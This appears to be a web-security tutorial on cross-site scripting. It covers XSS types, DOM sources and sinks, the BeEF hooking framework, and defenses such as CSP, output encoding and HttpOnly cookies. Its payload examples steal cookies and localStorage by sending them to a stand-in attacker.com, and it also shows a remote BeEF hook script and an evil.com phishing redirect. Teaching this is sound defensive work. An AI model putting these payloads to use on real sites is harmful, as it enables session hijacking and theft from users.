Web Security XSS

Cross-Site Scripting (XSS)

XSS is an injection vulnerability where an attacker injects malicious scripts into content served to other users. It's the #3 most common web vulnerability (OWASP) and enables everything from session theft to full browser control.

What is XSS?

Cross-Site Scripting occurs when a web application includes unsanitized user input in its HTML response. The browser executes injected JavaScript in the context of the vulnerable site — giving the attacker access to the victim's cookies, session tokens, DOM, localStorage, and the ability to make requests as the victim.

html — Simplest XSS Example
<!-- Vulnerable: user input reflected directly into HTML -->
<p>Hello, <?php echo $_GET['name']; ?></p>

<!-- Attacker sends: ?name=<script>alert(1)</script> -->
<!-- Page renders:  Hello, <script>alert(1)</script> -->
<!-- Browser executes the script! -->

Key misconception: alert(1) is just a proof of concept. Real attacks steal session cookies, perform actions as the victim, redirect users to phishing pages, or deploy keyloggers in the browser.

Types of XSS

Reflected XSS

The malicious script is in the HTTP request (e.g., URL parameter) and the server reflects it back in the immediate response. Not stored — victim must click a crafted link. Most common type, often found in search boxes and error messages.

Stored XSS (Persistent)

The malicious script is saved in the server's database and served to all users who view the affected page. Found in comments, profile fields, forum posts. Most dangerous — affects everyone who visits, no crafted link needed.

DOM-Based XSS

The vulnerability exists in the client-side JavaScript, not the server. The payload never reaches the server. Instead, dangerous DOM sinks like innerHTML, document.write(), or eval() process attacker-controlled data.

Self-XSS

Only affects the attacker's own browser. Not exploitable on its own, but can be combined with CSRF or social engineering ("paste this code in your console") to trick victims into running malicious JS themselves.

Blind XSS

The payload is stored and executed in a context the attacker can't directly observe — like an admin panel, logging system, or support ticket. Use tools like XSS Hunter to receive callbacks when your payload fires.

Mutation XSS (mXSS)

The browser's HTML parser transforms a safe-looking string into something dangerous when it's re-serialized. DOMPurify has had several mXSS bypasses. Extremely subtle and hard to detect.

What Can XSS Actually Do?

The impact of XSS depends on what the application does and what session privileges the victim has:

Session Hijacking

Steal document.cookie and send it to attacker's server. Log in as the victim.

Credential Theft

Inject a fake login form. Capture username/password when victim submits.

Keylogging

Attach an onkeypress event listener to capture every keystroke on the page.

Screenshotting

Use html2canvas to take screenshots of what the victim sees and send to attacker.

CSRF via XSS

Make fetch() requests as the victim — transfer money, change email, delete accounts.

Port Scanning

Use the victim's browser to scan internal network hosts by fetching internal IPs.

BeEF Hook

Load the Browser Exploitation Framework to control the victim's browser remotely.

Phishing Redirect

Redirect victim to a phishing page: window.location='https://evil.com'

javascript — Cookie Exfiltration
<!-- Classic cookie steal via image request -->
<script>
  new Image().src = "https://attacker.com/steal?c=" + document.cookie;
</script>

<!-- XSS Hunter / Blind XSS payload -->
<script src="https://yoursubdomain.xss.ht"></script>

<!-- Fetch-based exfiltration (modern) -->
<script>
  fetch("https://attacker.com/?data=" + btoa(document.cookie));

<!-- localStorage steal -->
<script>
  var data = JSON.stringify(localStorage);
  fetch("https://attacker.com/log?d=" + btoa(data));
</script>

DOM-Based XSS — Sources & Sinks

DOM XSS requires tracing data flow from a source (attacker-controlled input) to a sink (dangerous function that executes code).

javascript — Common Sources & Sinks
// SOURCES (attacker-controlled data):
document.URL
document.location.href
document.location.search
document.location.hash     // common — hash never sent to server
window.name
document.referrer
document.cookie

// SINKS (dangerous — execute code if given user input):
document.write()           // injects raw HTML
document.writeln()
element.innerHTML          // parses as HTML
element.outerHTML
element.insertAdjacentHTML()
eval()                     // executes string as JS
setTimeout("string", ms)   // executes string as JS
setInterval("string", ms)
Function("string")()
window.location = input    // open redirect / js: URL
jQuery.$()                 // with HTML string input
jQuery.html()

// EXAMPLE — Vulnerable DOM XSS
// URL: https://site.com/page#<img src=x onerror=alert(1)>
var hash = document.location.hash.substring(1);
document.getElementById("output").innerHTML = hash;  // SINK!

Tip: Use browser DevTools → Sources → Search all files for these sinks. Or use DOM Invader (built into Burp Suite's browser) to automatically identify DOM XSS sources and sinks.

Browser Exploitation Framework (BeEF)

BeEF hooks victim browsers via a persistent XSS payload, giving you a command-and-control panel to launch attacks from their browser.

bash + javascript — BeEF Hook
# Start BeEF on Kali
cd /usr/share/beef-xss && ./beef

# Default credentials: beef:beef
# Web UI: http://127.0.0.1:3000/ui/panel
# Hook URL: http://YOUR_IP:3000/hook.js

# XSS payload to hook a browser:
<script src="http://YOUR_IP:3000/hook.js"></script>

# What BeEF can do once hooked:
# - Steal cookies, LocalStorage, session data
# - Take screenshots and webcam shots
# - Execute arbitrary JavaScript
# - Port scan internal network
# - Redirect to phishing pages
# - Social engineering pop-ups
# - Metasploit browser autopwn integration

Defenses & Mitigations

Output Encoding

Encode all user-supplied data before rendering in HTML. < → &lt;. Use context-appropriate encoding (HTML, JS, URL, CSS).

Content Security Policy

CSP header restricts which scripts can execute. Content-Security-Policy: default-src 'self' blocks inline scripts and external sources.

HttpOnly & Secure Flags

Set HttpOnly on session cookies so XSS cannot steal them via document.cookie. Set Secure to prevent transmission over HTTP.

Input Validation

Validate and whitelist expected input formats. Reject input that doesn't match — but remember: validation alone is insufficient, encoding is required.

DOMPurify (DOM XSS)

Use the DOMPurify library to sanitize HTML before assigning to innerHTML. Never use innerHTML with raw user data without a sanitizer.

Modern Frameworks

React, Vue, Angular auto-escape output by default. Avoid dangerous patterns like dangerouslySetInnerHTML in React or the v-html directive in Vue.

html — CSP Header Example
# Strong CSP — blocks inline scripts, only allows own origin
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';

# With nonce for inline scripts
Content-Security-Policy: script-src 'nonce-r4nd0m'; object-src 'none';
# HTML: <script nonce="r4nd0m">...</script>

# Test your CSP at: https://csp-evaluator.withgoogle.com/

# Set HttpOnly and Secure cookies
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
